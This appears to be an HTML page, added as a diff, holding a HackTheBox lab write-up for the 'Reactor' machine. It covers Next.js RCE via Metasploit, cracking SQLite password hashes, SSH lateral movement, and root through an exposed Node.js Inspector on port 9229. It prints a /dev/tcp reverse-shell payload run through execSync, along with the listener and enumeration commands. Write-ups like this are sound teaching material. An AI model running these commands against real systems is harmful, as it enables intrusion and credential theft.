@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Reactor — HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Reactor (Easy, Linux) full write up: Next.js RCE → SQLite credential theft → SSH → Node.js Inspector (port 9229) → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / easy / linux</p>
+      <h1>Reactor</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-easy">Easy</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Reactor is a straightforward web-to-root chain. We gain an initial shell by exploiting a Next.js application, recover <strong>crackable hashes from a SQLite database</strong> for lateral movement to the <code>engineer</code> user via SSH, and finally pwn the box through a <strong>Node.js Inspector</strong> (port 9229) listening on localhost — a full OS command execution primitive.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Web application enumeration</li>
+        <li>Offline hash cracking fundamentals</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Using Metasploit modules for framework-specific RCE</li>
+        <li>Local port forwarding for internal services</li>
+        <li>Node.js Inspector (port 9229) as an RCE primitive</li>
+        <li>Why <code>bash -c</code> is required for <code>/dev/tcp</code> payloads in <code>execSync</code></li>
+      </ul>
+
+      <h2>Reconnaissance</h2>
+      <p>An initial full port scan reveals two open ports.</p>
+      <ul>
+        <li><strong>Port 22</strong> — SSH</li>
+        <li><strong>Port 3000</strong> — HTTP</li>
+      </ul>
+      <pre>nmap -sC -sV -p- &lt;target_ip&gt;</pre>
+      <p>Browsing to <code>http://&lt;target_ip&gt;:3000</code> reveals a web application built with <strong>Next.js</strong> and <strong>React</strong>. Directory and virtual host enumeration with both <code>feroxbuster</code> and <code>ffuf</code> return no interesting results.</p>
+      <pre>feroxbuster -u http://&lt;target_ip&gt;:3000
+ffuf -u http://&lt;target_ip&gt;:3000 -H "Host: FUZZ.&lt;target_ip&gt;" -w /path/to/wordlist</pre>
+
+      <h2>Initial Access</h2>
+      <h3>Exploiting the Next.js / React application</h3>
+      <p>Using Metasploit's <code>react2shell</code> module against the Next.js application yields an initial limited shell.</p>
+      <pre>msfconsole
+use &lt;react2shell module&gt;
+set RHOSTS &lt;target_ip&gt;
+set RPORT 3000
+run</pre>
+
+      <h2>Credential Discovery</h2>
+      <h3>SQLite database</h3>
+      <p>While enumerating the filesystem from the limited shell, a <strong>SQLite database file</strong> is discovered containing two hashed passwords.</p>
+      <pre>find / -name "*.db" 2>/dev/null
+sqlite3 &lt;database_file&gt;
+.tables
+SELECT * FROM users;</pre>
+      <p>The hashes are cracked offline (e.g. with <code>hashcat</code> or <code>john</code>), revealing credentials for the <code>engineer</code> user.</p>
+
+      <h2>Lateral Movement</h2>
+      <h3>SSH access</h3>
+      <p>Using the cracked credentials, SSH access is obtained as the <code>engineer</code> user.</p>
+      <pre>ssh engineer@&lt;target_ip&gt;</pre>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Internal port discovery</h3>
+      <p>Enumerating listening ports reveals an internal service on <code>localhost:9229</code> — the <strong>Node.js Inspector/Debugger</strong> protocol.</p>
+      <pre>ss -tlnp
+# or
+netstat -tlnp</pre>
+
+      <h3>Port forwarding</h3>
+      <p>The internal port is forwarded to the attacker machine over SSH.</p>
+      <pre>ssh -L 9229:127.0.0.1:9229 engineer@&lt;target_ip&gt;</pre>
+      <p>Confirming the port responds:</p>
+      <pre>curl http://localhost:9229
+# WebSockets request was expected</pre>
+
+      <h3>Node.js Inspector RCE</h3>
+      <p>Connect to the Node.js debugger using the built-in <code>node inspect</code> client:</p>
+      <pre>node inspect localhost:9229</pre>
+      <p>From the debug console, OS commands can be executed via the <code>child_process</code> module:</p>
+      <pre>exec("process.mainModule.require('child_process').execSync('id').toString()")</pre>
+      <p>A reverse shell is obtained by wrapping the payload in <code>bash -c</code>, ensuring <code>bash</code> (rather than <code>/bin/sh</code>) handles the redirection syntax:</p>
+      <pre>exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/&lt;attacker_ip&gt;/1337 0>&1\"').toString()")</pre>
+      <p>With a listener running on the attacker machine:</p>
+      <pre>nc -lvnp 1337</pre>
+      <p>A shell is received as the privileged user, completing the machine.</p>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Node.js Inspector (port 9229)</strong> exposed internally is a critical misconfiguration — it allows full OS command execution via the debug protocol.</li>
+        <li><strong><code>bash -c "..."</code></strong> is necessary when passing bash-specific syntax (like <code>&gt;&amp;</code> redirections and <code>/dev/tcp</code>) through <code>execSync</code>, since it defaults to <code>/bin/sh</code> which does not support these features.</li>
+        <li><strong>Hashed passwords stored in local database files</strong> are a common foothold for lateral movement on HTB machines.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
